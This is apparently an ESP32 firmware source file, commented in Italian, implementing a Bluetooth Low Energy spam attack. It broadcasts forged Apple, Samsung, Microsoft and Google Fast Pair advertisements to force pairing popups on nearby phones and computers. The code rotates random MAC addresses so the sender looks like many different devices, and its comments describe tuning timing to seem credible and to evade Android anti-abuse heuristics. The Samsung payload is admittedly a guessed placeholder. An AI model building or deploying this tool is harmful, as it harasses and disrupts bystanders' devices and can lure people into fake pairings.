#include <string.h>
#include "esp_log.h"
#include "esp_err.h"
#include "TaskManager.h"
#include "ble_spam.h"
#include "bleMng.h"

static const char *TAG = "BLE_SPAM";

#if CONFIG_BT_ENABLED

#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "host/ble_hs.h"

#define BLE_SPAM_TASK_PRIO        5
#define BLE_SPAM_TASK_STACK       4096
#define BLE_SPAM_EVT_TASK_EXITED  BIT0

/* Budget legacy adv (31 byte totali): flags AD (3) + header AD del
 * payload vendor (len+type, 2) = 5 byte fissi, restano 26 per il
 * payload vero e proprio. Ogni builder sotto sta ben dentro il limite. */
#define BLE_SPAM_MAX_PAYLOAD      26

#define BLE_SPAM_ADV_ITVL         0x0140   /* 320 * 0.625ms = 200ms (il commento diceva "100ms" per errore) */
#define BLE_SPAM_APPLE_ADV_ITVL   0x0020   /* 32 * 0.625ms = 20ms -- e' l'exact "fast advertising interval"
                                              * richiesto dalle Bluetooth Accessory Design Guidelines Apple
                                              * (developer.apple.com/library/archive/qa/qa1931): un vero
                                              * accessorio in discovery iniziale DEVE annunciarsi esattamente
                                              * a 20ms per almeno 30s, non un valore "vicino". Il documento
                                              * Apple stesso avverte che anche una minima deviazione da questi
                                              * intervalli puo' aumentare drasticamente il tempo di discovery
                                              * (o impedirla del tutto) -- e' l'ipotesi piu' probabile per cui
                                              * i nostri burst Apple, mandati a 200ms come tutti gli altri
                                              * vendor, potrebbero non risultare abbastanza "credibili". */
#define BLE_SPAM_BURST_MS         200      /* quanto resta up ogni identita' random prima di ruotare */
#define BLE_SPAM_GOOGLE_HOLD_MS   3000      /* Google: un vero provider Fast Pair in pairing mode non
                                              * cambia MAC ogni 200ms -- lo fa restare sullo stesso
                                              * indirizzo piu' a lungo cosi' assomiglia a un device vero
                                              * invece che al pattern "troppo anomalo" che le euristiche
                                              * anti-abuso di Play Services potrebbero sopprimere */

static TaskHandle_t       s_task_handle = NULL;
static EventGroupHandle_t s_evt = NULL;
static volatile bool      s_running = false;
static ble_spam_type_t    s_spam_type = BLE_SPAM_APPLE;

static const ble_uuid16_t s_fast_pair_uuid = BLE_UUID16_INIT(0xFE2C);

typedef enum {
    BLE_SPAM_VENDOR_APPLE = 0,
    BLE_SPAM_VENDOR_SAMSUNG,
    BLE_SPAM_VENDOR_GOOGLE,
    BLE_SPAM_VENDOR_MICROSOFT,
    BLE_SPAM_VENDOR_COUNT,
} ble_spam_vendor_t;

/* --- payload builders ---
 * Ognuno ritorna la lunghezza scritta in buf (mai oltre BLE_SPAM_MAX_PAYLOAD).
 * I byte non "strutturali" (status/batteria/riempimento) sono casuali:
 * ai fini del popup contano il company ID e il byte di sub-type, il resto
 * su iOS/Android non viene validato finche' non parte un pairing vero. */

/* Apple Continuity, company ID 0x004C. Modelli Proximity Pairing (0x07)
 * verificati da apple_ble_spam_ofw (Flipper Zero) -- vedi ble_spam.h. */
static const struct { uint16_t model; const char *name; } s_apple_airpods_models[] = {
    { 0x0220, "AirPods" },
    { 0x0F20, "AirPods 2" },
    { 0x1320, "AirPods 3" },
    { 0x0E20, "AirPods Pro" },
    { 0x1420, "AirPods Pro 2" },
    { 0x0620, "Beats Solo3" },
};

/* Nearby Action (0x0F): flag 0xC0 + un "action type" che decide il popup
 * mostrato. Questi due valori sono gli unici che ho potuto verificare con
 * ragionevole confidenza; la lista completa dei codici (setup AirTag,
 * HomePod, Apple Pencil, ecc.) va presa da apple_ble_spam_ofw/apple_ble_spam.c
 * o dal codice di ESP32Marauder -- aggiungili qui allo stesso modo in cui
 * abbiamo esteso le tabelle di ble_identify.c. */
static const uint8_t s_apple_nearby_actions[] = {
    0x13,   /* osservato come "AppleTV AutoFill" */
    0x20,   /* osservato come "Join This AppleTV" */
};

static size_t build_apple_payload(uint8_t *buf, size_t max_len)
{
    /* Alterna Proximity Pairing (popup stile AirPods) e Nearby Action
     * (popup stile "Setup New Device"), come fanno "Sour Apple"/"Apple Juice". */
    bool proximity_pairing = (esp_random() & 1) != 0;

    buf[0] = 0x4C;   /* Apple, Inc. */
    buf[1] = 0x00;

    if (proximity_pairing) {
        int idx = esp_random() % (sizeof(s_apple_airpods_models) / sizeof(s_apple_airpods_models[0]));
        uint16_t model = s_apple_airpods_models[idx].model;

        buf[2] = 0x07;   /* Proximity Pairing */
        buf[3] = 18;     /* lunghezza del body che segue */
        buf[4] = 0x01;   /* prefix osservato per i modelli audio (AirTag usa 0x05, non gestito qui) */
        buf[5] = (uint8_t)(model & 0xFF);        /* ordine little-endian: verifica se il popup
                                                    * mostra il device sbagliato, prova a invertire */
        buf[6] = (uint8_t)((model >> 8) & 0xFF);
        for (int i = 7; i < 4 + 18; i++) {
            buf[i] = (uint8_t)esp_random();   /* status/batteria/lid/colore/riempimento: non validati */
        }
        return 4 + 18;
    }

    int idx = esp_random() % (sizeof(s_apple_nearby_actions) / sizeof(s_apple_nearby_actions[0]));

    buf[2] = 0x0F;   /* Nearby Action */
    buf[3] = 0x04;   /* flags + action + 2 byte random */
    buf[4] = 0xC0;
    buf[5] = s_apple_nearby_actions[idx];
    buf[6] = (uint8_t)esp_random();
    buf[7] = (uint8_t)esp_random();
    return 8;
}

/* Samsung, company ID 0x0075. Struttura MOLTO meno verificata delle altre:
 * qui c'e' solo uno scheletro plausibile (sub-type + "device type" che
 * ruota) per non lasciare il vendor vuoto. Se vuoi che triggeri
 * affidabilmente i popup Galaxy Buds/Watch, prendi i byte esatti dalla
 * wiki di ESP32Marauder ("Samsung BLE Spam") e sostituiscili qui. */
static size_t build_samsung_payload(uint8_t *buf, size_t max_len)
{
    static const uint8_t device_types[] = { 0x03, 0x02 };   /* placeholder: buds-like / watch-like */
    int idx = esp_random() % (sizeof(device_types) / sizeof(device_types[0]));

    buf[0] = 0x75;
    buf[1] = 0x00;
    buf[2] = 0x01;               /* action/show byte, best-effort */
    buf[3] = device_types[idx];
    buf[4] = (uint8_t)esp_random();
    buf[5] = (uint8_t)esp_random();
    return 6;
}

/* Microsoft Swift Pair, company ID 0x0006. Struttura da
 * learn.microsoft.com (Beacon ID 0x03, byte RSSI riservato fisso 0x80) --
 * stessa che usa ble_identify.c per il rilevamento, qui alta confidenza. */
static size_t build_microsoft_payload(uint8_t *buf, size_t max_len)
{
    static const char *names[] = { "Surface Pen", "Xbox Controller", "PIXART Mouse" };
    int idx = esp_random() % (sizeof(names) / sizeof(names[0]));
    size_t name_len = strlen(names[idx]);
    if (name_len > max_len - 5) {
        name_len = max_len - 5;
    }

    buf[0] = 0x06;   /* Microsoft */
    buf[1] = 0x00;
    buf[2] = 0x03;   /* Beacon ID: Swift Pair */
    buf[3] = 0x00;   /* Sub scenario: normal pairing */
    buf[4] = 0x80;   /* Reserved RSSI byte, fisso per spec */
    memcpy(&buf[5], names[idx], name_len);
    return 5 + name_len;
}

/* Google Fast Pair: Service Data sull'UUID 0xFE2C (AD type 0x16). A
 * differenza di Apple/Microsoft il popup NON si basa su byte "strutturali"
 * decisi localmente dal telefono: il Model ID e' una chiave di lookup nel
 * registro dispositivi di Google (cache locale in Play Services + verifica
 * cloud). Un Model ID casuale/non registrato non risolve a nessun device
 * e Android scarta il pacchetto in silenzio -- nessun popup, nessun errore.
 * Serve quindi il Model ID VERO di un dispositivo Fast Pair reale, esattamente
 * come fanno i tool di riferimento (CapibaraZero/FastPairSpam, i BLE spam
 * per Flipper Zero di Willy-JL/Spooks4576): niente ID casuali o "debug". */
static const uint8_t s_google_model_ids[][3] = {
    { 0x47, 0x00, 0x00 },   /* Arduino 101 -- ID di riferimento pubblico di Google,
                              * usato apposta dai tool della community (es. CapibaraZero)
                              * perche' e' garantito risolvere su qualsiasi Android */
    { 0x92, 0xBB, 0xBD },   /* Pixel Buds */
    { 0x82, 0x1F, 0x66 },   /* JBL Flip 6 */
    { 0xF5, 0x24, 0x94 },   /* JBL Buds Pro */
    { 0x71, 0x8F, 0xA4 },   /* JBL Live 300TWS */
    { 0xCD, 0x82, 0x56 },   /* Bose NC 700 */
};

static size_t build_google_svc_data(uint8_t *buf, size_t max_len)
{
    int idx = esp_random() % (sizeof(s_google_model_ids) / sizeof(s_google_model_ids[0]));

    buf[0] = 0x2C;   /* UUID 0xFE2C, little-endian */
    buf[1] = 0xFE;
    buf[2] = s_google_model_ids[idx][0];
    buf[3] = s_google_model_ids[idx][1];
    buf[4] = s_google_model_ids[idx][2];
    return 5;
}

static ble_spam_vendor_t pick_vendor(void)
{
    switch (s_spam_type) {
        case BLE_SPAM_APPLE:     return BLE_SPAM_VENDOR_APPLE;
        case BLE_SPAM_SAMSUNG:   return BLE_SPAM_VENDOR_SAMSUNG;
        case BLE_SPAM_GOOGLE:    return BLE_SPAM_VENDOR_GOOGLE;
        case BLE_SPAM_MICROSOFT: return BLE_SPAM_VENDOR_MICROSOFT;
        case BLE_SPAM_ALL:
        default:
            return (ble_spam_vendor_t)(esp_random() % BLE_SPAM_VENDOR_COUNT);
    }
}

static uint32_t send_one_burst(void)
{
    /* HCI_LE_Set_Random_Address (chiamata da ble_hs_id_set_rnd() sotto)
     * e' rifiutata dal controller con "Command Disallowed" se
     * l'advertising del burst precedente e' ancora attivo -- fidarsi che
     * duration_ms l'abbia gia' fermato (col solo vTaskDelay nel task) non
     * e' affidabile al 100%, soprattutto per l'adv connettibile. Fermiamo
     * esplicitamente prima di toccare l'indirizzo: se non c'era nulla da
     * fermare ble_gap_adv_stop() ritorna un errore innocuo, lo ignoriamo. */
    ble_gap_adv_stop();

    uint8_t payload[BLE_SPAM_MAX_PAYLOAD];
    struct ble_hs_adv_fields fields;
    memset(&fields, 0, sizeof(fields));
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;

    /* Apple/Microsoft: puro broadcast, la UI si basa solo sui byte
     * dell'advertisement, non serve essere connettibili. Google Fast
     * Pair invece, dopo il popup, procede con un vero pairing via GATT
     * (Key-based Pairing characteristic) -- un provider reale in
     * pairing mode e' quindi SEMPRE connettibile. Se l'advertisement e'
     * non connettibile e' molto probabile che Android scarti il
     * pacchetto senza nemmeno mostrare la notifica. */
    bool connectable = false;
    ble_spam_vendor_t vendor = pick_vendor();

    size_t len = 0;
    switch (vendor) {
        case BLE_SPAM_VENDOR_APPLE:
            len = build_apple_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_SAMSUNG:
            len = build_samsung_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_MICROSOFT:
            len = build_microsoft_payload(payload, sizeof(payload));
            fields.mfg_data = payload;
            fields.mfg_data_len = len;
            break;
        case BLE_SPAM_VENDOR_GOOGLE:
            len = build_google_svc_data(payload, sizeof(payload));
            fields.svc_data_uuid16 = payload;
            fields.svc_data_uuid16_len = len;
            /* Le implementazioni note funzionanti (CapibaraZero/FastPairSpam,
             * i BLE spam per Flipper) accompagnano il Service Data con una
             * Service UUID List (AD 0x03) sulla stessa UUID -- replichiamola. */
            fields.uuids16 = &s_fast_pair_uuid;
            fields.num_uuids16 = 1;
            fields.uuids16_is_complete = 1;
            connectable = true;
            break;
        default:
            return BLE_SPAM_BURST_MS;
    }

    /* Google resta sulla stessa identita'/payload piu' a lungo (vedi
     * BLE_SPAM_GOOGLE_HOLD_MS sopra), gli altri vendor ruotano veloce
     * come prima. */
    uint32_t duration_ms = (vendor == BLE_SPAM_VENDOR_GOOGLE) ? BLE_SPAM_GOOGLE_HOLD_MS : BLE_SPAM_BURST_MS;

    /* Nuovo indirizzo non-resolvable private ad ogni burst: agli occhi
     * dei dispositivi vicini sembra un device sempre diverso, non lo
     * stesso che spamma ripetutamente. NOTA: per i burst connettibili
     * (Google) alcuni controller/host rifiutano una NRPA su advertising
     * connettibile -- e' una delle cose che il log qui sotto ci dira'. */
    ble_addr_t addr;
    int rc = ble_hs_id_gen_rnd(1, &addr);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_hs_id_gen_rnd failed: %d", rc);
        return BLE_SPAM_BURST_MS;
    }
    rc = ble_hs_id_set_rnd(addr.val);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_hs_id_set_rnd failed: %d", rc);
        return BLE_SPAM_BURST_MS;
    }

    rc = ble_gap_adv_set_fields(&fields);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_adv_set_fields failed: %d (connectable=%d, mfg_len=%d, svc_len=%d)",
                  rc, (int)connectable, fields.mfg_data_len, fields.svc_data_uuid16_len);
        return BLE_SPAM_BURST_MS;
    }

    /* Apple si annuncia al suo "fast advertising interval" ufficiale
     * (20ms, vedi BLE_SPAM_APPLE_ADV_ITVL sopra), gli altri vendor
     * restano sul default condiviso. */
    uint16_t adv_itvl = (vendor == BLE_SPAM_VENDOR_APPLE) ? BLE_SPAM_APPLE_ADV_ITVL : BLE_SPAM_ADV_ITVL;

    struct ble_gap_adv_params adv_params = {
        .conn_mode = connectable ? BLE_GAP_CONN_MODE_UND : BLE_GAP_CONN_MODE_NON,
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = adv_itvl,
        .itvl_max = adv_itvl,
    };

    /* duration_ms fa fermare l'adv da solo -- il task sotto dorme circa
     * lo stesso tempo e poi passa alla prossima identita'/payload. */
    rc = ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, duration_ms, &adv_params, NULL, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "ble_gap_adv_start failed: %d (connectable=%d)", rc, (int)connectable);
    }
    return duration_ms;
}

static void ble_spam_task(void *param)
{
    if (s_evt) {
        xEventGroupClearBits(s_evt, BLE_SPAM_EVT_TASK_EXITED);
    }

    while (s_running) {
        uint32_t duration_ms = send_one_burst();

        /* Aspetta a step piccoli invece di un vTaskDelay unico cosi'
         * ble_spam_stop() resta reattivo (~100ms) anche durante gli
         * hold lunghi di Google (BLE_SPAM_GOOGLE_HOLD_MS). */
        uint32_t waited = 0, total_wait = duration_ms + 20;
        while (s_running && waited < total_wait) {
            uint32_t step = (total_wait - waited < 100) ? (total_wait - waited) : 100;
            vTaskDelay(pdMS_TO_TICKS(step));
            waited += step;
        }
    }

    ble_gap_adv_stop();   /* nel caso ci fosse ancora un burst in volo */

    if (s_evt) {
        xEventGroupSetBits(s_evt, BLE_SPAM_EVT_TASK_EXITED);
    }
    task_manager_unregister_current_task();
    vTaskDelete(NULL);
}

esp_err_t ble_spam_start(ble_spam_type_t type)
{
    if (!ble_is_ready()) {
        ESP_LOGW(TAG, "BLE not ready: call ble_init() (bleMng.h) and wait for sync before ble_spam_start()");
        return ESP_ERR_INVALID_STATE;
    }
    /* Aggiornato per primo e incondizionatamente: pick_vendor() lo rilegge
     * ad ogni burst, quindi anche se il task e' gia' in esecuzione un
     * nuovo start() con un type diverso lo cambia "a caldo" dal prossimo
     * burst, invece di essere ignorato silenziosamente. */
    s_spam_type = type;

    if (s_running) {
        return ESP_OK;
    }
    if (s_evt == NULL) {
        s_evt = xEventGroupCreate();
        if (s_evt == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    s_running = true;

    esp_err_t err = task_manager_create_task(ble_spam_task, "ble_spam_task",
                                              BLE_SPAM_TASK_STACK, NULL,
                                              BLE_SPAM_TASK_PRIO, &s_task_handle);
    if (err != ESP_OK) {
        s_running = false;
        ESP_LOGE(TAG, "failed to create ble_spam_task: (%d) %s", err, esp_err_to_name(err));
        return err;
    }

    ESP_LOGI(TAG, "BLE spam started (type=%d)", (int)type);
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_running) {
        return ESP_OK;
    }
    s_running = false;

    EventBits_t bits = xEventGroupWaitBits(
        s_evt,
        BLE_SPAM_EVT_TASK_EXITED,
        pdTRUE, pdFALSE,
        pdMS_TO_TICKS(2000)
    );

    s_task_handle = NULL;

    if ((bits & BLE_SPAM_EVT_TASK_EXITED) == 0) {
        ESP_LOGW(TAG, "ble_spam_task did not confirm exit within the timeout");
        return ESP_ERR_TIMEOUT;
    }
    ESP_LOGI(TAG, "BLE spam stopped");
    return ESP_OK;
}

bool ble_spam_is_running(void)
{
    return s_running;
}

#else /* !CONFIG_BT_ENABLED */

esp_err_t ble_spam_start(ble_spam_type_t type)
{
    (void)type;
    ESP_LOGW(TAG, "BLE disabled in this build (CONFIG_BT_ENABLED not set)");
    return ESP_ERR_NOT_SUPPORTED;
}

esp_err_t ble_spam_stop(void)
{
    return ESP_OK;
}

bool ble_spam_is_running(void)
{
    return false;
}

#endif /* CONFIG_BT_ENABLED */
